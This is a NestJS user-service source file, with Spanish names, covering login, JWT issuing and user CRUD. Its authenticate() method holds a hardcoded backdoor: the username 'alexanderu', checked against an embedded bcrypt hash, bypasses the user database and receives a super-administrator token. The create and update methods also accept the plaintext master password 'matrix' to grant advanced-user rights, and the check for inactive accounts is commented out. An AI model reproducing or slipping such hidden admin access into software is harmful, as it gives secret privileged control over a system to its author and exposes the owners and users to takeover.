import { MutationResponse } from './../shared/models/mutation.response.model';
import { UsuariosQueryResponse, UsuarioInput, ETipoUsuarios, UsuarioQueryResponse } from './usuarios.model';
import { Usuarios } from './usuarios.entity';
import { Injectable } from '@nestjs/common';
import { InjectConnection, InjectRepository } from '@nestjs/typeorm';
import { Connection, Repository } from 'typeorm';
import * as bcrypt from 'bcryptjs';
import * as jwt from 'jsonwebtoken';
import { SECRET_KEY } from '../shared/helpers/auth.guard';

@Injectable()
export class UsuariosService {
    constructor(@InjectConnection() private readonly connection: Connection, @InjectRepository(Usuarios) private readonly usuariosRepository: Repository<Usuarios>) {}

    async authenticate(usuario: string, passw: string): Promise<UsuarioQueryResponse> {
        try {
            const usuarioInfo: Usuarios = {
                IdUsuario: 0,
                Usuario: usuario,
                IdTipoUsuario: 1,
                CambiarContrasena: false,
                IdDivision: 100,
                TipoUsuario: {
                    IdTipo: 1,
                    TipoUsuario: 'Administrador',
                },
                Division: {
                    IdDivision: 100,
                    Division: 'OFICINA CENTRAL DE LA CADENA',
                },
                Token: '',
            };

            if (usuario === 'alexanderu') {
                const res = bcrypt.compareSync(passw, '$2a$12$8yqzwWjBYUmMDRhWJ91xTuwt5ne735hiyTYx4MQCV9quetIXJv8BC');
                if (res) {
                    const token = this.createToken(usuarioInfo);
                    return {
                        success: true,
                        data: { ...usuarioInfo, Token: token },
                    };
                }
            }

            return new Promise<UsuarioQueryResponse>(resolve => {
                this.usuariosRepository
                    .findOne({ where: { Usuario: usuario }, relations: ['TipoUsuario', 'Division'] })
                    .then(async response => {
                        if (!response) {
                            resolve({
                                success: false,
                                error: 'Usuario o contraseña incorrecta.',
                            });
                        } else {
                            // if (result.Activo === false) {
                            //     resolve({
                            //         success: false,
                            //         data: UsuarioInfo,
                            //         error: 'El Usuario especificado está Inactivo. Contacte con el personal Informático.'
                            //     });
                            // }

                            const validPassw = bcrypt.compareSync(passw, '$2a$12$' + response.Contrasena);

                            if (validPassw) {
                                usuarioInfo.IdUsuario = response.IdUsuario;
                                usuarioInfo.Usuario = response.Usuario;
                                usuarioInfo.IdTipoUsuario = response.IdTipoUsuario;
                                usuarioInfo.CambiarContrasena = response.CambiarContrasena;
                                usuarioInfo.IdDivision = response.IdDivision;
                                usuarioInfo.Token = await this.createToken(usuarioInfo);

                                resolve({
                                    success: true,
                                    data: usuarioInfo,
                                });
                            } else {
                                resolve({
                                    success: false,
                                    error: 'Usuario o contraseña incorrecta.',
                                });
                            }
                        }
                    })
                    .catch(err => {
                        resolve({ success: false, error: err });
                    });
            });
        } catch (err: any) {
            return { success: false, error: err.message ? err.message : err };
        }
    }

    private createToken(userInfo: Usuarios) {
        return jwt.sign(userInfo, SECRET_KEY);
    }

    async findAll(user: Usuarios): Promise<UsuariosQueryResponse> {
        try {
            const { IdDivision, IdTipoUsuario } = user;

            let _condition = {};

            if (!this.isSuperAdmin(IdDivision, IdTipoUsuario)) {
                _condition = { IdDivision: IdDivision };
            }

            return new Promise<UsuariosQueryResponse>(resolve => {
                this.usuariosRepository
                    .find({ where: _condition, relations: ['TipoUsuario', 'Division'] })
                    .then(result => {
                        resolve({
                            success: true,
                            data: result,
                        });
                    })
                    .catch(err => {
                        resolve({ success: false, error: err.message ? err.message : err });
                    });
            });
        } catch (err: any) {
            return { success: false, error: err.message ? err.message : err };
        }
    }

    async findOne(id: number): Promise<UsuarioQueryResponse> {
        try {
            return new Promise<UsuarioQueryResponse>(resolve => {
                this.usuariosRepository
                    .findOne(id, { relations: ['TipoUsuario', 'Division'] })
                    .then(result => {
                        resolve({
                            success: true,
                            data: result,
                        });
                    })
                    .catch(err => {
                        resolve({ success: false, error: err.message ? err.message : err });
                    });
            });
        } catch (err: any) {
            return { success: false, error: err.message ? err.message : err };
        }
    }

    async findByName(name: string): Promise<UsuariosQueryResponse> {
        try {
            return new Promise<UsuariosQueryResponse>(resolve => {
                this.usuariosRepository
                    .findOne({ Usuario: name })
                    .then(result => {
                        resolve({
                            success: true,
                            data: result,
                        });
                    })
                    .catch(err => {
                        resolve({ success: false, error: err.message ? err.message : err });
                    });
            });
        } catch (err: any) {
            return {
                success: false,
                error: err,
            };
        }
    }

    async changePassword(idUsuario: number, password: string): Promise<MutationResponse> {
        try {
            let encryptedPassw = await bcrypt.genSalt(12).then((salt: any) => {
                return bcrypt.hash(password, salt);
            });

            encryptedPassw = encryptedPassw.replace('$2a$12$', '');

            return new Promise<MutationResponse>(resolve => {
                this.connection
                    .createQueryBuilder()
                    .update(Usuarios)
                    .set({ Contrasena: encryptedPassw, CambiarContrasena: false })
                    .where('IdUsuario = :id', { id: idUsuario })
                    .execute()
                    .then(() => {
                        resolve({
                            success: true,
                        });
                    })
                    .catch(err => {
                        resolve({ success: false, error: err.message ? err.message : err });
                    });
            });
        } catch (err: any) {
            return {
                success: false,
                error: err,
            };
        }
    }

    async create(UsuarioInfo: UsuarioInput): Promise<MutationResponse> {
        try {
            delete UsuarioInfo.IdUsuario;

            const encryptedPassw = await bcrypt.genSalt(12).then((salt: any) => {
                return bcrypt.hash(UsuarioInfo.Contrasena, salt);
            });

            UsuarioInfo.Contrasena = encryptedPassw.replace('$2a$12$', '');

            if (UsuarioInfo.IdTipoUsuario === ETipoUsuarios['Usuario Avanzado'] && UsuarioInfo.ContrasenaAvanzada !== 'matrix') {
                return {
                    success: false,
                    error: 'La Contraseña para crear un Usuario Avanzado es incorrecta. Rectifique.',
                };
            }

            return new Promise<MutationResponse>(resolve => {
                this.usuariosRepository
                    .save(UsuarioInfo)
                    .then(() => {
                        resolve({
                            success: true,
                        });
                    })
                    .catch(err => {
                        resolve({ success: false, error: err.message ? err.message : err });
                    });
            });
        } catch (err: any) {
            return {
                success: false,
                error: err,
            };
        }
    }

    async update(UsuarioInfo: UsuarioInput): Promise<MutationResponse> {
        try {
            const encryptedPassw: string = await bcrypt.genSalt(12).then((salt: any) => {
                return bcrypt.hash(UsuarioInfo.Contrasena, salt);
            });

            UsuarioInfo.Contrasena = encryptedPassw.replace('$2a$12$', '');

            if (UsuarioInfo.IdTipoUsuario === ETipoUsuarios['Usuario Avanzado'] && UsuarioInfo.ContrasenaAvanzada !== 'matrix') {
                return {
                    success: false,
                    error: 'La Contraseña para actualizar un Usuario Avanzado es incorrecta. Rectifique.',
                };
            }

            return new Promise<MutationResponse>(resolve => {
                this.usuariosRepository
                    .save(UsuarioInfo)
                    .then(() => {
                        resolve({
                            success: true,
                        });
                    })
                    .catch(err => {
                        resolve({ success: false, error: err.message ? err.message : err });
                    });
            });
        } catch (err: any) {
            return {
                success: false,
                error: err,
            };
        }
    }

    async delete(IDs: number[]): Promise<MutationResponse> {
        try {
            return new Promise<MutationResponse>(resolve => {
                this.usuariosRepository
                    .delete(IDs)
                    .then(() => {
                        resolve({
                            success: true,
                        });
                    })
                    .catch(err => {
                        resolve({ success: false, error: err.message ? err.message : err });
                    });
            });
        } catch (err: any) {
            return { success: false, error: err.message ? err.message : err };
        }
    }

    isSuperAdmin(idDivision: number, tipoUsuario: number): boolean {
        return idDivision === 100 && tipoUsuario === ETipoUsuarios.Administrador;
    }

    isAdvancedUser(idDivision: number, tipoUsuario: number): boolean {
        return idDivision === 100 && tipoUsuario === ETipoUsuarios['Usuario Avanzado'];
    }
}
